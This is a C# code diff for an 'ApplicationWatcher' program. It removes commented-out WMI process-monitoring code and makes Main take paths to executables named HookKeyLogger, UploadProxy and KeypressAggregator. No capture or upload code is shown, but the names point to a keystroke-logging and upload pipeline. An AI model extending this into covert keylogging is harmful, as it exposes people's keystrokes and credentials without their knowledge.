@@ -10,49 +10,7 @@ namespace ApplicationWatcher
 {
     public class ApplicationWatcherAsync
     {
-        //private void WmiEventHandler(object sender, EventArrivedEventArgs e)
-        //{
-        //    //in this point the new events arrives
-        //    //you can access to any property of the Win32_Process class
-        //    Console.WriteLine("TargetInstance.Handle :    " + ((ManagementBaseObject)e.NewEvent.Properties["TargetInstance"].Value)["Handle"]);
-        //    Console.WriteLine("TargetInstance.Name :      " + ((ManagementBaseObject)e.NewEvent.Properties["TargetInstance"].Value)["Name"]);
-
-        //}
-
-        //public ApplicationWatcherAsync()
-        //{
-        //    try
-        //    {
-        //        string ComputerName = "localhost";
-        //        string WmiQuery;
-        //        ManagementEventWatcher Watcher;
-        //        ManagementScope Scope;
-
-        //        Scope = new ManagementScope(String.Format("\\\\{0}\\root\\CIMV2", ComputerName), null);
-        //        Scope.Connect();
-
-        //        WmiQuery = "Select * From __InstanceCreationEvent Within 1 " +
-        //        "Where TargetInstance ISA 'Win32_Process' ";
-
-        //        Watcher = new ManagementEventWatcher(Scope, new EventQuery(WmiQuery));
-        //        Watcher.EventArrived += new EventArrivedEventHandler(this.WmiEventHandler);
-        //        Watcher.Start();
-        //        Console.Read();
-        //        Watcher.Stop();
-        //    }
-        //    catch (Exception e)
-        //    {
-        //        Console.WriteLine("Exception {0} Trace {1}", e.Message, e.StackTrace);
-        //    }
-
-        //}
-
-        //public static void Main(string[] args)
-        //{
-        //    Console.WriteLine("Listening process creation, Press Enter to exit");
-        //    ApplicationWatcherAsync eventWatcher = new ApplicationWatcherAsync();
-        //    Console.Read();
-        //}
+       
         private static string locationExeHook = "HookKeyLogger.exe";
         private static string locationExeProxy="UploadProxy.exe";
         private static string locationExeAgg = "KeypressAggregator.exe";
@@ -60,8 +18,13 @@ namespace ApplicationWatcher
         ///<summary>
         ///Monitor the WMI to see when processes start and stop.
         ///</summary>
-        public static void Main()
+        public static void Main(string[] args)
         {
+            if (args.Length < 3)
+                throw new Exception("Needs three arguments for the locations of the EXE files.");
+            locationExeHook = args[0];
+            locationExeProxy = args[1];
+            locationExeAgg = args[2];
             bool debugOn = true;
             //System.Threading.Thread.Sleep(1000);
             if(!debugOn)
